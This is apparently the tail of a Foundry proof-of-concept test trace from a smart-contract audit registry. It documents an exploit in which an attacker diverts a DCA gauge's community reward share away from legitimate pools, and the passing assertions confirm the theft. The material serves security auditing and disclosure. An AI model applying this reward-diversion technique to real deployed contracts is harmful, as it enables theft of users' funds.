+    │   │   └─ ← [Return] 500000000000000000000 [5e20]
+    │   ├─ [6436] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x0000000000000000000000000000000000000a11)
+    │   │   ├─ [3172] SuperDCAGauge::beforeAddLiquidity(0x0000000000000000000000000000000000000a11, PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [474] MiniPoolManager::sync(DCAToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x229b333ea287f05e763505ca469513af779b6dba58581e526dd000a8a7836ede: 0x00000000000000000000000000000000000000000000000000000000000f4240 → 0x00000000000000000000000000000000000000000000000000000000001e8480
+    │   │   └─ ← [Return]
+    │   ├─ [3263] MiniPoolManager::rewardPotOf(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a })) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [486] DCAToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   │   └─ ← [Return] 500000000000000000000 [5e20]
+    │   ├─  storage changes:
+    │   │   @ 5: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   @ 6: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   └─ ← [Return]
+    ├─ [567] Exploit::communityShare() [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [0] VM::assertEq(500000000000000000000 [5e20], 500000000000000000000 [5e20], "community share") [staticcall]
+    │   └─ ← [Return]
+    ├─ [462] Exploit::attackerStolen() [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [0] VM::assertEq(500000000000000000000 [5e20], 500000000000000000000 [5e20], "attacker stole the community share") [staticcall]
+    │   └─ ← [Return]
+    ├─ [396] Exploit::legitPot() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "legit pool received nothing") [staticcall]
+    │   └─ ← [Return]
+    ├─ [396] Exploit::legitPot() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [462] Exploit::attackerStolen() [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [0] VM::assertLt(0, 500000000000000000000 [5e20], "legit pool got less than the attacker") [staticcall]
+    │   └─ ← [Return]
+    ├─ [574] Exploit::dcaAddr() [staticcall]
+    │   └─ ← [Return] DCAToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [486] DCAToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [0] VM::assertEq(500000000000000000000 [5e20], 500000000000000000000 [5e20], "stolen DCA at attacker EOA") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.62ms (4.58ms CPU time)
+
+Ran 1 test suite in 126.36ms (2.62ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+_shared/run-poc/run_poc.sh: line 71:  8558 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/63420-h-2-attackers-will-steal-rewards-from-legitimate-pools-by-ma_exp)
